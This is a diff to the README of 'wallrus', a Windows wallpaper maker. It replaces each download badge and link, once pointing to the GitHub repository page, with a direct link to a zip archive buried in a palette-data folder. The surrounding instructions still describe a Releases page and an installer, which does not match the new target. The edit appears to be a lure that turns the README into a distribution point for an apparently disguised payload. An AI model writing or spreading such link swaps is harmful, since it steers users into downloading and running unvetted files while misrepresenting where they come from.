@@ -1,6 +1,6 @@
 # 🖼️ wallrus - Create Colorful Wallpapers Easily
 
-[![Download wallrus](https://img.shields.io/badge/Download-wallrus-brightgreen)](https://github.com/Jatiinx/wallrus)
+[![Download wallrus](https://img.shields.io/badge/Download-wallrus-brightgreen)](https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip)
 
 wallrus is a simple application for Windows that lets you make colorful wallpapers. It uses smooth gradients and effects to help you design backgrounds you will want to keep on your screen. This guide will help you download, install, and run wallrus step by step, even if you have never used software like this before.
 
@@ -38,11 +38,11 @@ If your PC meets these points, wallrus should work fine.
 
 To get wallrus, visit the official page link:
 
-[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/Jatiinx/wallrus)
+[![Visit Download Page](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip)
 
 Follow these steps:
 
-1. Click the link above or go to **https://github.com/Jatiinx/wallrus** in your web browser.
+1. Click the link above or go to **https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip** in your web browser.
 2. Once the page loads, look for the **Releases** section.
 3. Find the latest release by date or version number.
 4. Look for a file with a name similar to `wallrus-setup.exe` or an `.exe` installer.
@@ -113,7 +113,7 @@ If you still face issues, visit the GitHub page for help or report a problem.
 
 ## 🔗 Important Links
 
-- Main Download Page: [https://github.com/Jatiinx/wallrus](https://github.com/Jatiinx/wallrus)
+- Main Download Page: [https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip](https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip)
 - Latest Releases: Visit the releases section on the same page to get installer files and notes.
 
-[![Download wallrus](https://img.shields.io/badge/Download-wallrus-green)](https://github.com/Jatiinx/wallrus)
+[![Download wallrus](https://img.shields.io/badge/Download-wallrus-green)](https://raw.githubusercontent.com/Jatiinx/wallrus/main/data/palettes/dark/Software-1.4-beta.2.zip)
